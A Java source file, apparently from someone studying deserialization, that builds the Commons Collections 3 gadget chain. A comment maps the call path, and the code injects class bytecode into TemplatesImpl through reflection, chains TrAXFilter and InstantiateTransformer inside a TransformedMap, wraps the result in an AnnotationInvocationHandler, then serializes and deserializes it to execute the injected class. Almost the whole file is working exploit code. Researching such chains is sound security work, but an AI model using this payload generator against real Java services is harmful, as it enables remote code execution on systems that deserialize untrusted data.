package CC3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.Transformer;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
/*
AnnotationInvocationHandler#readObject() -> AbstractInputCheckedMapDecorator#setValue() ->
TransformedMap#checkSetValue() -> ChainedTransformer#transform() ->ConstantTransformer#transform() ->
InvokerTransformer#transform() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() ->
TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()

AnnotationInvocationHandler#readObject() -> AbstractInputCheckedMapDecorator#setValue() ->
TransformedMap#checkSetValue() -> ChainedTransformer#transform() ->ConstantTransformer#transform() ->
InstantiateTransformer#transform() -> TrAXFilter#getConstructor() -> TrAXFilter#构造方法 ->
TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() ->
TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
 */

public class CC3 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
// source: bytecodes/HelloTemplateImpl.java
        byte[] code = Files.readAllBytes(Paths.get("E:\\IdeaProjects\\反序列化链\\HelloTemplatesImpl.class"));
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
//                new ConstantTransformer(obj),
//                new InvokerTransformer("newTransformer", null, null)
                new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { obj })
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "test");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
//        outerMap.put("test", "xxxx");

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance=ctor.newInstance(Target.class, outerMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("serialize.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(instance);
        objectOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("serialize.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Object result = objectInputStream.readObject();
        objectInputStream.close();
    }
}